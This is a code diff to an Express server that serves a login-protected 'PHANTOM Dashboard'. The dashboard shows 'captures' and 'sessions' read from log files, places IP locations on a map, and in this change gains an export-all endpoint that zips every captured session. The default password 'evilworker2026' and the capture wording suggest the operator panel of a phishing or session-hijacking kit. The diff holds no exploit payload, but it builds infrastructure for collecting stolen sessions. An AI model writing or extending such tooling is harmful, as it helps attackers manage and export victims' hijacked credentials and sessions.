@@ -733,18 +733,24 @@ const GLASS_DASHBOARD_HTML = `<!DOCTYPE html>
     }
 
     function updateMap(logs) {
-        if (!map) {
-            map = L.map('map').setView([20, 0], 2);
-            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                attribution: '&copy; OpenStreetMap, &copy; CartoDB'
-            }).addTo(map);
-        }
-        map.eachLayer(layer => {
-            if (layer instanceof L.Marker) map.removeLayer(layer);
-        });
-        L.marker([20, 0]).addTo(map)
-            .bindPopup('📍 IP locations will appear here once you have captures.');
+    if (!map) {
+        map = L.map('map').setView([20, 0], 2);
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+            attribution: '&copy; OpenStreetMap, &copy; CartoDB'
+        }).addTo(map);
     }
+    // Remove old markers (keep the base layer)
+    map.eachLayer(layer => {
+        if (layer instanceof L.Marker) map.removeLayer(layer);
+    });
+    // Add a simple marker to confirm map is working
+    if (logs.length === 0) {
+        L.marker([20, 0]).addTo(map).bindPopup('📍 No captures yet — sessions will appear here.');
+    } else {
+        // You can add real markers here using IP geolocation later
+        L.marker([20, 0]).addTo(map).bindPopup('✅ Dashboard is live! Captures will be shown here.');
+    }
+}
 
     function updateChart(logs) {
         const ctx = document.getElementById('captureChart').getContext('2d');
@@ -911,19 +917,25 @@ const dashApp = express();
 const dashUser = process.env.DASHBOARD_USER || 'admin';
 const dashPass = process.env.DASHBOARD_PASS || 'evilworker2026';
 
-dashApp.use(express.json());
-
-// Serve the glassmorphism dashboard HTML
-dashApp.get('/', (req, res) => {
-    res.send(GLASS_DASHBOARD_HTML);
-});
-
+// ✅ 1. 𝙰𝙿𝙿𝙻𝚈 𝙱𝙰𝚂𝙸𝙲 𝙰𝚄𝚃𝙷 𝙵𝙸𝚁𝚂𝚃
 dashApp.use(basicAuth({
     users: { [dashUser]: dashPass },
     challenge: true,
     realm: 'PHANTOM Dashboard'
 }));
 
+// ✅ 2. 𝙿𝙰𝚁𝚂𝙴 𝙹𝚂𝙾𝙽
+dashApp.use(express.json());
+
+// ✅ 3. 𝚂𝙴𝚁𝚅𝙴 𝚂𝚃𝙰𝚃𝙸𝙲 𝙵𝙸𝙻𝙴𝚂 (𝚒𝚏 𝚊𝚗𝚢)
+dashApp.use(express.static('public'));
+
+// ✅ 4. 𝚂𝙴𝚁𝚅𝙴 𝚃𝙷𝙴 𝙷𝚃𝙼𝙻
+dashApp.get('/', (req, res) => {
+    res.send(GLASS_DASHBOARD_HTML);
+});
+
+// ✅ 5. 𝙰𝙿𝙸 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂
 dashApp.get('/api/logs', (req, res) => {
     try {
         const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
@@ -955,6 +967,38 @@ dashApp.get('/api/log/:filename', (req, res) => {
             }
         });
         res.json({ filename: req.params.filename, entries });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/export/all', (req, res) => {
+    try {
+        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+        if (files.length === 0) return res.status(404).json({ error: 'No logs' });
+        const zip = new AdmZip();
+        files.forEach(f => {
+            const content = fs.readFileSync(path.join(LOGS_DIRECTORY, f));
+            zip.addFile(f, content);
+        });
+        const zipBuffer = zip.toBuffer();
+        res.setHeader('Content-Type', 'application/zip');
+        res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
+        res.send(zipBuffer);
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/status', (req, res) => {
+    try {
+        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+        const last = files.length > 0 ? fs.statSync(path.join(LOGS_DIRECTORY, files[0])).mtime : null;
+        res.json({
+            online: true,
+            totalSessions: files.length,
+            lastCapture: last
+        });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
